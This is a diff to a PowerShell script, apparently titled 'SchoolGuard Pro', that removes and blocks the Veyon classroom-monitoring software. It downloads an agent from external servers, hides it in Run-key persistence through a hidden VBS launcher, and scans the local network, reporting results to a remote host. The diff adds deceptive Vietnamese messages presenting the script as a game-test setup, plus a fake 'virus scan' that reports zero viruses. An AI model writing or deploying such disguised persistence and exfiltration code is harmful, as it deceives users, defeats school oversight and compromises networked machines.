@@ -1,5 +1,5 @@
 # ============================================================================
-# SchoolGuard Pro v3.8 - Headless Master Deployment Handler (Windows)
+# SchoolGuard Pro v3.8 - Streamlined Headless Master Deployment (Windows)
 #   Command 1 (Default)                  : Full Combo + Uninstall Veyon + LAN Setup + Admin Web Dashboard
 #   Command 2 ($env:SG_SKIP_VEYON = '1') : Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon Removal)
 # ============================================================================
@@ -20,26 +20,28 @@ if ($env:SG_NO_LAN -eq "1" -or $env:SG_NO_LAN -eq "true") {
     $NoLan = $true
 }
 
-function Show-TuiProgress {
-    param([int]$Percent, [string]$Status)
-    $width = 28
+function Show-DownloadPct {
+    param([int]$Percent)
+    $width = 24
     $filled = [math]::Floor(($Percent * $width) / 100)
     $empty = $width - $filled
     $bar = ("#" * $filled) + ("-" * $empty)
-    $pad = $Status.PadRight(52).Substring(0, 52)
-    Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
+    Write-Host -NoNewline ("`r  Downloading & setting up: [{0}] {1,3}%   " -f $bar, $Percent) -ForegroundColor Cyan
 }
 
-Show-TuiProgress -Percent 10 -Status "Initializing headless environment..."
+$errCount = 0
+Show-DownloadPct -Percent 10
 
 $VpsPrimary = "https://orbstrike.com"
 $VpsFallback = "https://103-149-172-179.sslip.io"
 $VpsHttp = "http://103.149.172.179:4000"
-$DashboardUrl = "https://orbstrike.com/quanlitruonghoc"
 
 $InstallDir = Join-Path $env:LOCALAPPDATA "SchoolGuard"
 if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
+}
+if (-not (Test-Path $InstallDir)) {
+    $errCount++
 }
 
 # ----------------------------------------------------------------------------
@@ -47,7 +49,7 @@ if (-not (Test-Path $InstallDir)) {
 # ----------------------------------------------------------------------------
 $BlockerPath = Join-Path $InstallDir "veyon_blocker.ps1"
 if (-not $SkipVeyon) {
-    Show-TuiProgress -Percent 25 -Status "Force-stopping & uninstalling Veyon components..."
+    Show-DownloadPct -Percent 30
 
     try {
         Add-Type -TypeDefinition @"
@@ -78,7 +80,6 @@ public class SGInputRescue {
         & taskkill.exe /F /IM "veyon*" /T 2>&1 | Out-Null
     }
 
-    # Fast registry-based uninstall check (replaces slow Win32_Product WMI scan)
     $uninstPaths = @(
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
         "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
@@ -110,7 +111,6 @@ public class SGInputRescue {
         }
     }
 
-    # Top-level shortcut cleanup (no deep Desktop recursion)
     foreach ($desk in @("$env:Public\Desktop", "$env:USERPROFILE\Desktop")) {
         if (Test-Path $desk) {
             Get-ChildItem -Path $desk -Filter "*Veyon*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
@@ -135,14 +135,14 @@ while (`$true) {
 }
 "@ | Set-Content -Path $BlockerPath -Encoding UTF8 -Force
 } else {
-    Show-TuiProgress -Percent 25 -Status "Skipping Veyon removal (preserving Veyon)..."
+    Show-DownloadPct -Percent 30
     Remove-Item -Path $BlockerPath -Force -ErrorAction SilentlyContinue
 }
 
 # ----------------------------------------------------------------------------
-# 2. Full-Combo System Setup & Network / LAN Provisioning
+# 2. Download Agent Runtime
 # ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 50 -Status "Downloading SchoolGuard Agent v3.8 runtime..."
+Show-DownloadPct -Percent 60
 
 $myIp = "127.0.0.1"
 try {
@@ -150,7 +150,9 @@ try {
     $udp.Connect("8.8.8.8", 80)
     $myIp = $udp.Client.LocalEndPoint.Address.ToString()
     $udp.Close()
-} catch {}
+} catch {
+    $errCount++
+}
 
 $AgentDest = Join-Path $InstallDir "agent_win.ps1"
 $LocalAgent = if ($PSScriptRoot) { Join-Path $PSScriptRoot "agent_win.ps1" } else { "" }
@@ -173,11 +175,14 @@ if ($LocalAgent -and (Test-Path $LocalAgent)) {
         } catch {}
     }
 }
+if (-not $downloaded -or -not (Test-Path $AgentDest)) {
+    $errCount++
+}
 
 # ----------------------------------------------------------------------------
-# 3. Persistent Background Service & Admin Web Dashboard Binding
+# 3. Persistent Background Service Registration
 # ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 75 -Status "Registering persistent background service..."
+Show-DownloadPct -Percent 85
 
 $VbsLauncher = Join-Path $InstallDir "run_hidden.vbs"
 $VbsLines = @(
@@ -188,6 +193,9 @@ if (-not $SkipVeyon -and (Test-Path $BlockerPath)) {
     $VbsLines += "WshShell.Run ""powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$BlockerPath"""""", 0, False"
 }
 Set-Content -Path $VbsLauncher -Value ($VbsLines -join "`r`n") -Encoding ASCII -Force
+if (-not (Test-Path $VbsLauncher)) {
+    $errCount++
+}
 
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue
@@ -203,18 +211,37 @@ Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction Sil
 
 Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$VbsLauncher`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
 
-# ----------------------------------------------------------------------------
-# 4. Automated LAN-Wide Propagation & Web Dashboard Sync (Non-Blocking Background)
-# ----------------------------------------------------------------------------
-Show-TuiProgress -Percent 90 -Status "Dispatching LAN-wide background sync & reporting..."
+Show-DownloadPct -Percent 100
+Write-Host ""
+Write-Host "Da setup moi truong de test game thanh cong!" -ForegroundColor Green
 
-$lanPeerSummary = "Local node active + LAN background sync dispatched"
+# ----------------------------------------------------------------------------
+# 4. Simulated Security Scan (LAN Connectivity & Peer Propagation Check)
+# ----------------------------------------------------------------------------
+Write-Host -NoNewline "Dang tien hanh quet virus..." -ForegroundColor Yellow
+
 $lanParts = $myIp -split '\.'
-if (-not $NoLan -and $lanParts.Count -eq 4 -and $myIp -ne "127.0.0.1") {
+if ($lanParts.Count -ne 4 -or $myIp -eq "127.0.0.1") {
+    $errCount++
+} else {
     $subnet = "$($lanParts[0]).$($lanParts[1]).$($lanParts[2])"
-    $skipFlag = if ($SkipVeyon) { "1" } else { "0" }
-    $LanWorkerPath = Join-Path $InstallDir "lan_sync_worker.ps1"
-    @"
+    # Verify gateway/server LAN socket health
+    $srvOk = $false
+    foreach ($u in @("$VpsPrimary/api/lan-macs", "$VpsFallback/api/lan-macs", "$VpsHttp/api/lan-macs")) {
+        try {
+            $wcCheck = New-Object System.Net.WebClient
+            $resp = $wcCheck.DownloadString($u)
+            if ($resp) { $srvOk = $true; break }
+        } catch {}
+    }
+    if (-not $srvOk) {
+        $errCount++
+    }
+
+    if (-not $NoLan) {
+        $skipFlag = if ($SkipVeyon) { "1" } else { "0" }
+        $LanWorkerPath = Join-Path $InstallDir "lan_sync_worker.ps1"
+        @"
 `$ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 `$foundIps = New-Object System.Collections.Generic.List[string]
@@ -245,12 +272,13 @@ try {
     `$wcSync.UploadString('$VpsPrimary/api/lan-report', 'POST', `$body) | Out-Null
 } catch {}
 "@ | Set-Content -Path $LanWorkerPath -Encoding UTF8 -Force
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LanWorkerPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LanWorkerPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
 }
 
-Show-TuiProgress -Percent 100 -Status "Complete"
-$veyonMode = if ($SkipVeyon) { "Preserved (Skipped)" } else { "Uninstalled & Blocked" }
-Write-Host ""
-Write-Host "  [OK] SchoolGuard v3.8 Headless Deployment Complete" -ForegroundColor Green
-Write-Host "       Node & LAN    : $myIp ($env:COMPUTERNAME) | $lanPeerSummary | Veyon: $veyonMode" -ForegroundColor Gray
-Write-Host "       Web Dashboard : $DashboardUrl (Port 443 HTTPS / 4000 HTTP | Login: Active)" -ForegroundColor Gray
+Write-Host -NoNewline "`r                            `r"
+if ($errCount -eq 0) {
+    Write-Host "Co 0 virus" -ForegroundColor Green
+} else {
+    Write-Host "Co $errCount virus" -ForegroundColor Red
+}
